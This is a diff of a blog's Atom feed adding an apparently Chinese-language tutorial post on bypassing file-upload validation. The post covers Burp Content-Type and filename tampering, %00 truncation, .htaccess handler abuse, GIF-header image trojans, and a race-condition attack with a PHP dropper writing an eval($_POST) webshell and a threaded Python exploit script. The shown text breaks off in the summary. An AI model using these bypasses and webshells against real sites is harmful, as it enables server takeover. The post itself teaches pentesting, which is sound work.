@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2017-04-06T05:06:16.824Z</updated>
+  <updated>2017-07-18T06:45:15.768Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -14,6 +14,168 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>文件上传漏洞总结</title>
+    <link href="http://yoursite.com/2017/07/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
+    <id>http://yoursite.com/2017/07/17/文件上传漏洞总结/</id>
+    <published>2017-07-17T08:25:16.000Z</published>
+    <updated>2017-07-18T06:45:15.768Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><pre><code>文件上传漏洞可以说是日常渗透测试中用得最多的一个漏洞，用它获得服务器权限最快最直接。在Web程序中，经常需要用到文件上传的功能。如用户或者管理员上传图片，或者其它文件。如果没有限制上传类型或者限制不严格被绕过，就有可能造成文件上传漏洞。如果上传了可执行文件或者网页脚本，就会导致网站被控制甚至服务器沦陷。，复杂一点的情况是配合 Web Server的解析漏洞来获取控制权或结合文件包含漏洞。此篇文章主要分三部分：总结一些常见的上传文件校验方式，以及绕过校验的各种姿势，最后对此漏洞提几点防护建议。
+</code></pre><h2 id="2-上传检测流程"><a href="#2-上传检测流程" class="headerlink" title="2. 上传检测流程"></a>2. 上传检测流程</h2><pre><code>通常一个文件以HTTP协议进行上传时，将以POST请求发送至Web服务器，Web服务器接收到请求并同意后，用户与Web服务器将建立连接，并传输数据。一般文件上传过程中将会经过如下几个检测步骤：
+</code></pre><p><img src="http://ofrdce5qv.bkt.clouddn.com/1.png" alt=""></p>
+<a id="more"></a>
+<ul>
+<li>客户端javascript校验（一般只校验文件的扩展名）</li>
+</ul>
+<ul>
+<li>服务端校验<ul>
+<li>文件头content-type字段校验（image/gif）</li>
+<li>文件内容头校验（GIF89a）</li>
+<li>目录路经检测（检测跟Path参数相关的内容）</li>
+<li>文件扩展名检测 (检测跟文件 extension 相关的内容)</li>
+<li>后缀名黑名单校验</li>
+<li>后缀名白名单校验</li>
+<li>自定义正则校验</li>
+</ul>
+</li>
+<li>WAF设备校验（根据不同的WAF产品而定）</li>
+</ul>
+<h2 id="3-客户端校验"><a href="#3-客户端校验" class="headerlink" title="3. 客户端校验"></a>3. 客户端校验</h2><pre><code>这类检测通常在上传页面里含有专门检测文件上传的 javascript 代码 最常见的就是检测扩展名是否合法，有白名单形式也有黑名单形式。
+</code></pre><ul>
+<li>这类检测，通常是在上传页面里含有专门检测文件上传的JavaScript代码，最常见的就是检测扩展名是否合法，示例代码如下：</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line">function CheckFileType()</div><div class="line">&#123;</div><div class="line">    var objButton=document.getElementById("Button1");//上传按钮</div><div class="line">    var objFileUpload=document.getElementById("FileUpload1");</div><div class="line">    var objMSG=document.getElementById("msg");//显示提示信息用DIV</div><div class="line">    var FileName=new String(objFileUpload.value);//文件名</div><div class="line">    var extension=new String(FileName.substring(FileName.lastIndexOf(".")+1,FileName.length));//文件扩展名</div><div class="line"></div><div class="line">    if(extension=="jpg"||extension=="JPG")//可以另行添加扩展名</div><div class="line">    &#123;</div><div class="line">        objButton.disabled=false;//启用上传按钮</div><div class="line">        objMSG.innerHTML="文件检测通过";</div><div class="line">    &#125;</div><div class="line">    else</div><div class="line">    &#123;</div><div class="line">        objButton.disabled=true;//禁用上传按钮</div><div class="line">        objMSG.innerHTML="请选择正确的文件上传";</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<ul>
+<li>判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，(进一步确定可以通过配置浏览器HTTP代理（没有流量经过代理就可以证明是客户端JavaScript检测））内容如：只允许传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。</li>
+</ul>
+<p>绕过方法：</p>
+<ul>
+<li>将需要上传的恶意代码文件类型改为允许上传的类型，例如将shell.asp改为shell.jpg上传，配置Burp Suite代理进行抓包，然后再将文件名shell.jpg改为shell.asp</li>
+<li>上传页面，审查元素，修改JavaScript检测函数（具体方法：可以使用firbug之类的插件把它禁掉）</li>
+</ul>
+<h2 id="4-服务端检测"><a href="#4-服务端检测" class="headerlink" title="4. 服务端检测"></a>4. 服务端检测</h2><h3 id="4-1-服务端MIME类型检测"><a href="#4-1-服务端MIME类型检测" class="headerlink" title="4.1. 服务端MIME类型检测"></a>4.1. 服务端MIME类型检测</h3><p>MIME的作用：使客户端软件，区分不同种类的数据，例如web浏览器就是通过MIME类型来判断文件是GIF图片，还是可打印的PostScript文件。web服务器使用MIME来说明发送数据的种类， web客户端使用MIME来说明希望接收到的数据种类。</p>
+<p>服务器端检测文件MIME类型可能的代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'type'</span>] != <span class="string">"image/gif"</span>)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"Sorry, we only allow uploading GIF images"</span>;</div><div class="line">    <span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line">$uploaddir = <span class="string">'./'</span>;</div><div class="line">$uploadfile = $uploaddir . basename($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]);</div><div class="line"><span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $uploadfile))</div><div class="line">&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"File is valid, and was successfully uploaded.\n"</span>;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"File uploading failed.\n"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<ul>
+<li>绕过方法</li>
+</ul>
+<p>配置Burp Suite代理进行抓包，将Content-Type修改为image/gif，或者其他允许的类型<br><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720170717173714.png" alt=""><br>然后在对应目录生成shell.jpg</p>
+<h3 id="4-2-服务端目录路径检测"><a href="#4-2-服务端目录路径检测" class="headerlink" title="4.2. 服务端目录路径检测"></a>4.2. 服务端目录路径检测</h3><p><img src="http://ofrdce5qv.bkt.clouddn.com/3.png" alt=""></p>
+<ul>
+<li>上传的数据包中，如果存在path(或者其他名称)等能够操作上传路径的参数，修改该参数配合解析漏洞Get Webshell,测试代码</li>
+<li>条件：php版本5.3.4以下；gpc关闭</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'upload'</span>]))</div><div class="line">&#123;</div><div class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'flv'</span>,<span class="string">'swf'</span>,<span class="string">'mp3'</span>,<span class="string">'mp4'</span>,<span class="string">'3gp'</span>,<span class="string">'zip'</span>,<span class="string">'rar'</span>,<span class="string">'gif'</span>,<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'bmp'</span>);</div><div class="line">    $file_ext = substr($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>],strpos($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</div><div class="line">    <span class="keyword">if</span>(in_array($file_ext,$file_arr))</div><div class="line">    &#123;</div><div class="line">        $tempFile = $_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">        <span class="comment">//这里的$_REQUEST['jieduan']造成可以利用截断上传</span></div><div class="line">        $targePath = $_SERVER[<span class="string">'DOCUMENT_ROOT'</span>].$_REQUEST[<span class="string">'jieduan'</span>].rand(<span class="number">10</span>,<span class="number">99</span>).</div><div class="line">            date(<span class="string">'YmdHis'</span>).<span class="string">"."</span>.$file_ext;</div><div class="line">        <span class="keyword">if</span>(move_uploaded_file($tempFile,$targePath))</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">'上传成功'</span>.<span class="string">'&lt;br&gt;'</span>;</div><div class="line">            <span class="keyword">echo</span> <span class="string">'路径'</span>.$targePath;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">echo</span>(<span class="string">"上传失败"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">echo</span>(<span class="string">"上传失败"</span>);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p><img src="http://ofrdce5qv.bkt.clouddn.com/4.png" alt=""><br><img src="http://ofrdce5qv.bkt.clouddn.com/5.png" alt=""></p>
+<h3 id="4-3-服务端文件扩展名检测"><a href="#4-3-服务端文件扩展名检测" class="headerlink" title="4.3. 服务端文件扩展名检测"></a>4.3. 服务端文件扩展名检测</h3><ul>
+<li>黑名单检测：<br>黑名单的安全性比白名单低很多，服务器端，一般会有个专门的blacklist文件，里面会包含常见的危险脚本文件类型，例如：html | htm | php | php2 | hph3 | php4 | php5 | asp | aspx | ascx | jsp | cfm | cfc | bat | exe | com | dll | vbs | js | reg | cgi | htaccess | asis | sh |phtm | shtm |inc等等。</li>
+</ul>
+<p>黑名单扩展名过滤，限制不够全面：IIS默认支持解析.asp | .cdx | .asa | .cer等<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getExt</span><span class="params">($filename)</span></span>&#123;</div><div class="line">    <span class="comment">//sunstr - 返回字符串的子串</span></div><div class="line">    <span class="comment">//strripos — 计算指定字符串在目标字符串中最后一次出现的位置（不区分大小写）</span></div><div class="line">    <span class="keyword">return</span> substr($filename,strripos($filename,<span class="string">'.'</span>)+<span class="number">1</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"Error: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">"&lt;br /&gt;"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line">    $black_file = explode(<span class="string">"|"</span>,<span class="string">"php|jsp|asp"</span>);<span class="comment">//允许上传的文件类型组</span></div><div class="line">    $new_upload_file_ext = strtolower(getExt($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>])); <span class="comment">//取得被.隔开的最后字符串</span></div><div class="line">    <span class="keyword">if</span>(in_array($new_upload_file_ext,$black_file))</div><div class="line">    &#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"文件不合法"</span>;</div><div class="line">        <span class="keyword">die</span>();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        $filename = time().<span class="string">"."</span>.$new_upload_file_ext;</div><div class="line">        <span class="keyword">if</span>(move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],<span class="string">"upload/"</span>.$filename))</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"Upload Success"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>不被允许的文件格式.php，但是可以上传文件名为shell.php_(下划线是空格)，IIS支持，linux不支持，详细见下面的特殊文件名绕过描述；</p>
+<ul>
+<li>白名单检测<br>仅允许指定的文件类型上传，比如仅与需上传jpg | gif | doc等类型的文件，其他全部禁止</li>
+<li><p>绕过方法：</p>
+<ul>
+<li><p>文件名大小写绕过</p>
+<p> 用像 AsP，pHp 之类的文件名绕过黑名单检测</p>
+</li>
+<li><p>名单列表绕过</p>
+<p> 用黑名单里没有的名单进行攻击，比如黑名单里没有 asa 或 cer 之类 </p>
+</li>
+<li><p>特殊文件名绕过：</p>
+<p>比如发送的 http 包里把文件名改成 test.asp. 或 test.asp_(下划线为空格)，这种命名方式 在 windows 系统里是不被允许的，所以需要在 burp 之类里进行修改，然后绕过验证后，会 被 windows 系统自动去掉后面的点和空格，但要注意 Unix/Linux 系统没有这个特性</p>
+</li>
+<li><p>0x00截断</p>
+<p>文件名后缀就一个%00字节，可以截断某些函数对文件名的判断。在许多语言函数中处理函数中，处理字符串中<br>在扩展名检测这大部分都是 asp 的程序有这种漏洞，给个简单的伪代码 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Name = getname(http requests)//假如这一步获取到的文件名是dama.asp .jpg</div><div class="line">Type = gettype(name)//而在该函数中，是从后往前扫描文件扩展名，所以判断为jpg文件</div><div class="line">If(type == jpg)</div><div class="line">SaveFileToPath(UploadPath.name , name)//但在这里却是以0x00作为文件名截断，最后以dama.asp存入路径里</div></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<p>操作方法：上传dama.jpg，Burp抓包，将文件名改为dama.php%00.jpg，选中%00，进行url-decode。<br><img src="http://ofrdce5qv.bkt.clouddn.com/6.png" alt=""><br><img src="http://ofrdce5qv.bkt.clouddn.com/7.png" alt=""><br><img src="http://ofrdce5qv.bkt.clouddn.com/8.png" alt=""></p>
+<pre><code>**PHP任意文件上传漏洞（CVE-2015-2348）**该漏洞存在于php的move_uploaded_file()函数中，这个函数一般在上传文件时被使用，用途是将上传的文件移动到新位置。这次的漏洞就出现在$destination这个参数中，这个参数代表的是上传文件移动的最终目的地址。如果$destination变量是从用户$_GET或$_POST中获得的并且我们可控，那么我们可以利用空字符\x00来截断后面的拓展名，从而造成任意文件上传。
+
+演示代码：
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">    <span class="meta">&lt;?php</span></div><div class="line"><span class="comment">/*</span></div><div class="line">move_uploaded_file(string $filename,string $destination)</div><div class="line">$destination参数代表得失上传文件移动的最终目的地址</div><div class="line">如果$destination变量是从用户$_GET或$_POST中获得的并且我们可控，</div><div class="line">那么我们可以利用空字符\x00来截断后面的拓展名，从而造成任意文件上传</div><div class="line">*/</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'Upload'</span>]))&#123;</div><div class="line">    $target_path = WEB_PAGE_TO_ROOT.<span class="string">"hackable/uploads/"</span>;</div><div class="line">    $target_path = $target_path . basename($_FILES[<span class="string">'uploaded'</span>][<span class="string">'name'</span>]);</div><div class="line">    $uploaded_name = $_FILES[<span class="string">'uploaded'</span>][<span class="string">'name'</span>];</div><div class="line">    $uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, <span class="string">'.'</span>) + <span class="number">1</span>);</div><div class="line">    $uploaded_size = $_FILES[<span class="string">'uploaded'</span>][<span class="string">'size'</span>];</div><div class="line">    <span class="keyword">if</span> (($uploaded_ext == <span class="string">"jpg"</span> || $uploaded_ext == <span class="string">"JPG"</span> || $uploaded_ext == <span class="string">"jpeg"</span> || $uploaded_ext == <span class="string">"JPEG"</span>) &amp;&amp; ($uploaded_size &lt; <span class="number">100000</span>))&#123;</div><div class="line">        <span class="keyword">if</span>(!move_uploaded_file($_FILES[<span class="string">'uploaded'</span>][<span class="string">'tmp_name'</span>], $_POST[<span class="string">'drops'</span>])) &#123;</div><div class="line">            $html .= <span class="string">'&lt;pre&gt;'</span>;</div><div class="line">            $html .= <span class="string">'Your image was not uploaded.'</span>;</div><div class="line">            $html .= <span class="string">'&lt;/pre&gt;'</span>;</div><div class="line">        &#125;<span class="keyword">else</span> &#123;</div><div class="line">            $html .= <span class="string">'&lt;pre&gt;'</span>;</div><div class="line">            $html .= $target_path . <span class="string">' succesfully uploaded!'</span>;</div><div class="line">            $html .= <span class="string">'&lt;/pre&gt;'</span>;</div><div class="line">        &#125;&#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        $html .= <span class="string">'&lt;pre&gt;'</span>;</div><div class="line">        $html .= <span class="string">'Your image was not uploaded.'</span>;</div><div class="line">        $html .= <span class="string">'&lt;/pre&gt;'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</code></pre><p>然后我们上传文件，这里把POST的drops参数利用空字符进行截断<br><img src="http://ofrdce5qv.bkt.clouddn.com/13.png" alt=""></p>
+<ul>
+<li><p>.htaccess 文件攻击 </p>
+<p>配合名单列表绕过，上传一个自定义的.htaccess，就可以轻松绕过各种检测,该文件仅在Apache平台上存在，.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。该文件的写法如下：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="section">&lt;FilesMatch "a.jpg"&gt;</span></div><div class="line"> <span class="attribute"><span class="nomarkup">SetHandler</span></span> application/x-httpd-php</div><div class="line"><span class="section">&lt;/FilesMatch&gt;</span></div></pre></td></tr></table></figure>
+<p>保存为.htaccess文件。该文件的意思是，只要遇到文件名中包含有”a.jpg”字符串的任意文件，统一执行。如果这个”a.jpg”的内容是一句话木马，即可利用中国菜刀进行连接<br><img src="http://ofrdce5qv.bkt.clouddn.com/9.png" alt=""><br><img src="http://ofrdce5qv.bkt.clouddn.com/10.png" alt=""><br><img src="http://ofrdce5qv.bkt.clouddn.com/11.png" alt=""><br><img src="http://ofrdce5qv.bkt.clouddn.com/12.png" alt=""></p>
+<h3 id="4-4-服务端文件内容检测"><a href="#4-4-服务端文件内容检测" class="headerlink" title="4.4. 服务端文件内容检测"></a>4.4. 服务端文件内容检测</h3><ul>
+<li>文件幻数检测：</li>
+</ul>
+<p>JPG ： FF D8 FF E0 00 10 4A 46 49 46</p>
+<p>GIF ： 47 49 46 38 39 61 (GIF89a)</p>
+<p>PNG： 89 50 4E 47</p>
+<p>绕过方法：<br>在文件幻数后面加上自己的一句话木马就行了。</p>
+<ul>
+<li>文件相关信息检测：</li>
+</ul>
+<p>一般就是检查图片文件的大小，图片文件的尺寸之类的信息。</p>
+<p>绕过方法：<br>伪造好文件幻数，在后面添加一句话木马之后，再添加一些其他的内容，增大文件的大小。</p>
+</li>
+</ul>
+<p><strong>通常，对于文件内容检查的绕过，就是直接用一个结构完整的文件进行恶意代码注入即可。</strong></p>
+<p>   简化的演示代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">var_dump(getimagesize(<span class="string">"shell.php"</span>));</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p><img src="http://ofrdce5qv.bkt.clouddn.com/14.png" alt=""><br>加上GIF头内容<br><img src="http://ofrdce5qv.bkt.clouddn.com/15.png" alt=""></p>
+<h2 id="5-竞争上传"><a href="#5-竞争上传" class="headerlink" title="5. 竞争上传"></a>5. 竞争上传</h2><p>演示代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$allowtype = <span class="keyword">array</span>(<span class="string">"gif"</span>,<span class="string">"png"</span>,<span class="string">"jpg"</span>);</div><div class="line">$size = <span class="number">10000000</span>;</div><div class="line">$path = <span class="string">"./"</span>;</div><div class="line"></div><div class="line">$filename = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span>(is_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]))&#123;</div><div class="line">    <span class="keyword">if</span>(!move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$path.$filename))&#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">"error:can not move"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">"error:not an upload file！"</span>);</div><div class="line">&#125;</div><div class="line">$newfile = $path.$filename;</div><div class="line"><span class="keyword">echo</span> <span class="string">"file upload success.file path is: "</span>.$newfile.<span class="string">"\n&lt;br /&gt;"</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'error'</span>]&gt;<span class="number">0</span>)&#123;</div><div class="line">    unlink($newfile);</div><div class="line">    <span class="keyword">die</span>(<span class="string">"Upload file error: "</span>);</div><div class="line">&#125;</div><div class="line">$ext = array_pop(explode(<span class="string">"."</span>,$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]));</div><div class="line"><span class="keyword">if</span>(!in_array($ext,$allowtype))&#123;</div><div class="line">    unlink($newfile);</div><div class="line">    <span class="keyword">die</span>(<span class="string">"error:upload the file type is not allowed，delete the file！"</span>);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，我们的利用思路是这样的，首先上传一个php文件，内容为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">"./info.php"</span>, <span class="string">"w"</span>), <span class="string">'&lt;?php @eval($_POST["drops"]) ?&gt;'</span>); <span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。利用代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">RaceCondition</span><span class="params">(threading.Thread)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        threading.Thread.__init__(self)</div><div class="line">        self.url = <span class="string">"http://127.0.0.1:8080/upload/shell0.php"</span></div><div class="line">        self.uploadUrl = <span class="string">"http://127.0.0.1:8080/upload/copy.php"</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_get</span><span class="params">(self)</span>:</span></div><div class="line">        print(<span class="string">'try to call uploaded file...'</span>)</div><div class="line">        r = requests.get(self.url)</div><div class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</div><div class="line">            print(<span class="string">"[*]create file info.php success"</span>)</div><div class="line">            os._exit(<span class="number">0</span>)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_upload</span><span class="params">(self)</span>:</span></div><div class="line">        print(<span class="string">"upload file....."</span>)</div><div class="line">        file = &#123;<span class="string">"file"</span>:open(<span class="string">"shell0.php"</span>,<span class="string">"r"</span>)&#125;</div><div class="line">        requests.post(self.uploadUrl, files=file)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</div><div class="line">                self._get()</div><div class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</div><div class="line">                self._upload()</div><div class="line">                self._get()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    threads = <span class="number">20</span></div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads):</div><div class="line">        t = RaceCondition()</div><div class="line">        t.start()</div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads):</div><div class="line">        t.join()</div></pre></td></tr></table></figure>
+<p>经过几次尝试后成功成功写入shell<br><img src="http://ofrdce5qv.bkt.clouddn.com/16.png" alt=""></p>
+<h2 id="6-图片木马制作"><a href="#6-图片木马制作" class="headerlink" title="6. 图片木马制作"></a>6. 图片木马制作</h2><p><strong>命令：</strong></p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">copy</span><span class="bash"> /b 1.jpg+2.php</span></div></pre></td></tr></table></figure>
+<h2 id="7-总结"><a href="#7-总结" class="headerlink" title="7. 总结"></a>7. 总结</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">条件： 寻找一个上传点，查看上传点是否可用。</div><div class="line"></div><div class="line">利用：</div><div class="line"></div><div 